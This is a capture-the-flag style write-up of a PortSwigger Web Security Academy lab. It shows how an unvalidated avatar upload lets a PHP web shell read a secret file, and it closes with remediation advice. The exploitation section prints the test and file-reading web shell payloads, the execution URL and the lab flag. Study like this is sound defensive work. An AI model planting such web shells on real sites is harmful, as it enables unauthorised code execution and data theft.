# Remote Code Execution via Web Shell Upload

**Platform:** PortSwigger Web Security Academy  
**Category:** Web / File Upload Vulnerabilities  
**Level:** Apprentice  
**Date:** 22.10.2026  
**Status:** ✅ Solved  
**Lab Link:** https://0ab4000804bc34268435c2af008300c1.web-security-academy.net/

---

## 1. Objective
It is required to upload a simple PHP web shell and use it to retrieve the contents of the `/home/carlos/secret` file.

## 2. Reconnaissance
- Was given login and password for the account `wiener:peter`, logged in.
- In the account tab, found the 'Upload' button for the avatar.
- Uploaded a random file (not an image), everything was successful.
- Through DevTools, found the path where the avatar is saved: `/files/avatars/...`

## 3. Exploitation

### Step 1: Creating and uploading a web shell
1. Created a PHP file to check if the site runs PHP files and uploaded it:
```php
<?php echo "Hello world"; ?>
```
2. Navigated to the endpoint of the uploaded file `https://0aec005903c5388a802e6c58000d00ec.web-security-academy.net/files/avatars/exploit.php` and the site returned 'Hello world' to me.
3. Changed the contents of `exploit.php` to `<?php echo file_get_contents('/home/carlos/secret'); ?>` and uploaded it via the 'my-account' tab.
4. Navigating to the endpoint, I received the flag `oO1guZv4Xla9vZt4kKjZNeF3zhlZVObI`.

**Payloads:**
```text
Test shell: <?php echo "Hello world"; ?>
Final shell: <?php echo file_get_contents('/home/carlos/secret'); ?>
Execution URL: https://0aec005903c5388a802e6c58000d00ec.web-security-academy.net/files/avatars/exploit.php
```

**Why it worked:**  
The server executed the PHP code because it does not check the file extension on the server-side. With the help of simple code uploaded under the guise of an avatar, we forced the site to execute the contained command locally on itself, as a result of which we gained access to the data.

## 4. Result
Flag found, laboratory work solved.

## 5. Key Takeaway & Remediation

**What I learned:**  
When adding the ability to upload files to the server, it is critically important to ensure strict validation on the server side. The absence of such a check allows an attacker to upload an executable script (web shell) and gain full control over command execution on the server (RCE).

**How to protect:**
1. Strict validation: Allow uploading only specific, safe file extensions (for example, `.jpg`, `.png`), rather than relying on data sent by the client, or enforce forced renaming.
2. Disable script execution: Configure the web server so that in the upload directory, the execution of any scripts (PHP, Python, etc.) is completely disabled.
